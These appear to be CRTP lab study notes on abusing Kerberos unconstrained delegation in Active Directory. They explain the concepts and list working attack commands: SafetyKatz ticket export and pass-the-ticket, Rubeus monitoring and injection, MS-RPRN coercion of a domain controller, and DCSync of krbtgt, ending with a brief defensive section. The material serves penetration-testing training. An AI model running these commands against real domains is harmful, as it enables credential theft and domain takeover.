# Privilege Escalation – Kerberos Delegation

## 1. Overview

**Kerberos Delegation** allows a service to reuse an end-user's Kerberos credentials to access resources hosted on another server.

This is commonly useful in **multi-tier applications** where Kerberos authentication needs to work across multiple hops.

### Example – Double Hop

```text
User
 │
 │ 1st Hop
 ▼
Web Server
 │
 │ 2nd Hop
 ▼
Database Server
```

For example, a user authenticates to a web server, and the web server then needs to access a database server on behalf of that user.

The primary goal of delegation is **user impersonation**.

---

# 2. Types of Kerberos Delegation

There are two main types discussed in this module:

## Unconstrained Delegation

Unconstrained delegation allows the first-hop server to request access to **any service on any computer in the domain** on behalf of a user.

```text
User
  │
  ▼
Web Server
  │
  ├──► Database Server
  ├──► File Server
  └──► Other Domain Resources
```

This makes unconstrained delegation particularly sensitive because compromise of the delegated server can potentially expose reusable Kerberos credentials.

---

## Constrained Delegation

Constrained delegation restricts the first-hop server to accessing **specific services on specific computers**.

```text
Web Server
    │
    ├──► Database Server : MSSQL
    │
    └──► File Server : CIFS
```

If Kerberos authentication is not used to authenticate to the first hop, **Protocol Transition** can be used to transition the request to Kerberos.

---

# 3. How Unconstrained Delegation Works

When unconstrained delegation is enabled, the Domain Controller places the user's **Ticket Granting Ticket (TGT)** inside the service ticket.

When the user authenticates to the delegated server, the server can extract the user's TGT and store it in **LSASS**.

The service can then use the user's TGT to request additional service tickets and access other resources as that user.

This is why unconstrained delegation can be dangerous when the delegated server is compromised.

---

# 4. Authentication Flow

The basic flow can be represented as:

```text
1. User authenticates to the Domain Controller
                │
                ▼
2. DC returns a TGT
                │
                ▼
3. User requests a TGS for the Web Server
                │
                ▼
4. DC provides the TGS
                │
                ▼
5. User sends the required Kerberos tickets to Web Server
                │
                ▼
6. Web Server uses the user's TGT to request a TGS
   for the Database Server
                │
                ▼
7. Web Server connects to Database Server
   as the user
```

The important concept is that the **Web Server is able to act on behalf of the user** when delegation is configured.

---

# 5. Discovering Unconstrained Delegation

## PowerView

PowerView can be used to identify domain computers configured for unconstrained delegation:

```powershell
Get-DomainComputer -UnConstrained
```

This helps identify computers where the `TrustedForDelegation` property is enabled.

---

## ActiveDirectory PowerShell Module

The ActiveDirectory module can also be used.

### Computers

```powershell
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
```

### Users

```powershell
Get-ADUser -Filter {TrustedForDelegation -eq $True}
```

These commands can help identify accounts or computers configured for delegation.

---

# 6. Security Implications

An unconstrained delegation server should be treated as a **high-value target**.

If an attacker compromises such a server and a highly privileged user authenticates to it, Kerberos credentials associated with that user may become available to the compromised server.

Conceptually:

```text
Compromised Delegation Server
          │
          ▼
Privileged User authenticates
          │
          ▼
Kerberos ticket becomes available
          │
          ▼
Ticket can potentially be reused
          │
          ▼
Access resources as privileged user
```

Therefore, organizations should carefully restrict where unconstrained delegation is configured.

---

# 7. Ticket Extraction

The material demonstrates exporting Kerberos tickets using SafetyKatz:

```cmd
SafetyKatz.exe "sekurlsa::tickets /export"
```

The exported tickets can then be examined for potentially useful Kerberos credentials.

> Use ticket extraction only in an authorized lab or penetration-testing environment.

---

# 8. Pass-the-Ticket

A Kerberos ticket can be injected into the current session using the `kerberos::ptt` functionality demonstrated in the material.

Example:

```cmd
SafetyKatz.exe "kerberos::ptt <ticket-file.kirbi>"
```

The general concept is:

```text
Kerberos Ticket
      │
      ▼
Ticket Injection
      │
      ▼
Current Logon Session
      │
      ▼
Access resources using the ticket
```

This technique is commonly referred to as **Pass-the-Ticket (PtT)**.

---

# 9. Machine Coercion

The material also introduces **machine coercion**.

Certain Microsoft services and protocols can allow an authenticated user to cause one machine to authenticate to another machine.

The purpose in this attack chain is to make a privileged machine authenticate to a system where its Kerberos authentication material can potentially be captured.

Conceptually:

```text
Attacker
   │
   │ Coercion
   ▼
Domain Controller
   │
   │ Authentication
   ▼
Delegated Server
   │
   ▼
Kerberos Ticket
```

The material references **MS-RPRN / SpoolSample** as one example of a coercion technique.

---

# 10. Monitoring for Kerberos Tickets with Rubeus

Rubeus can be used to monitor for newly available Kerberos tickets.

Example from the lab:

```cmd
Rubeus.exe monitor /interval:5 /nowrap
```

The command monitors for tickets at the specified interval.

---

# 11. MS-RPRN / SpoolSample

The material demonstrates using MS-RPRN to cause the domain controller to authenticate to another machine:

```cmd
MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \
\\dcorp-appsrv.dollarcorp.moneycorp.local
```

The exact behavior and availability of coercion techniques depend on the Windows version, configuration, patches, and enabled services.

---

# 12. Ticket Injection with Rubeus

After obtaining a ticket in the lab, the material demonstrates injecting it using Rubeus:

```cmd
Rubeus.exe ptt /ticket:<BASE64_TICKET>
```

The general process is:

```text
Capture / Obtain Ticket
        │
        ▼
Copy Ticket Data
        │
        ▼
Rubeus PTT
        │
        ▼
Ticket Injected
        │
        ▼
Current Session Can Use Ticket
```

---

# 13. DCSync

After obtaining the required privileged Kerberos access in the lab, the material demonstrates **DCSync** using SafetyKatz:

```cmd
SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt"
```

DCSync abuses Active Directory replication functionality to request credential material from a Domain Controller.

The `krbtgt` account is particularly sensitive because it is involved in the Kerberos authentication infrastructure of the domain.

---

# 14. Attack Chain – Lab Concept

The complete attack chain demonstrated in this section can be summarized as:

```text
Identify Unconstrained Delegation
            │
            ▼
Compromise Delegated Server
            │
            ▼
Wait for / Coerce Authentication
            │
            ▼
Obtain Kerberos Ticket
            │
            ▼
Pass-the-Ticket
            │
            ▼
Obtain Higher Privileges
            │
            ▼
DCSync
```

The important CRTP concepts to remember are:

**Unconstrained Delegation → Kerberos Tickets → Ticket Injection → Privilege Escalation → DCSync**

---

# 15. Important Commands

| Purpose                      | Command                                                   |
| ---------------------------- | --------------------------------------------------------- |
| Find unconstrained computers | `Get-DomainComputer -UnConstrained`                       |
| Find delegated computers     | `Get-ADComputer -Filter {TrustedForDelegation -eq $True}` |
| Find delegated users         | `Get-ADUser -Filter {TrustedForDelegation -eq $True}`     |
| Export Kerberos tickets      | `SafetyKatz.exe "sekurlsa::tickets /export"`              |
| Pass-the-Ticket              | `SafetyKatz.exe "kerberos::ptt <ticket-file>"`            |
| Monitor tickets              | `Rubeus.exe monitor /interval:5 /nowrap`                  |
| Inject ticket with Rubeus    | `Rubeus.exe ptt /ticket:<ticket>`                         |
| DCSync                       | `SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt"`     |

---

# 16. Key Takeaways

* **Kerberos Delegation** enables a service to act on behalf of a user.
* **Unconstrained Delegation** allows delegation to services across the domain.
* **Constrained Delegation** limits delegation to specified services and computers.
* Unconstrained delegation can expose reusable Kerberos credentials on a compromised delegated server.
* **TGTs** are particularly valuable because they can be used to request additional service tickets.
* **Pass-the-Ticket** involves injecting a Kerberos ticket into a logon session.
* **Machine coercion** can be used in certain environments to trigger authentication from another machine.
* **Rubeus** can monitor and interact with Kerberos tickets.
* **DCSync** abuses Active Directory replication to retrieve credential material.
* The overall CRTP attack chain is:

```text
Enumeration
    ↓
Delegation Discovery
    ↓
Server Compromise
    ↓
Authentication / Coercion
    ↓
Kerberos Ticket
    ↓
Pass-the-Ticket
    ↓
Privilege Escalation
    ↓
DCSync
```

## Defensive Perspective

From a defensive standpoint, organizations should carefully review accounts and computers configured for delegation, minimize unnecessary unconstrained delegation, monitor unusual Kerberos ticket activity, restrict privileged accounts from authenticating to untrusted systems, and monitor suspicious Active Directory replication requests.
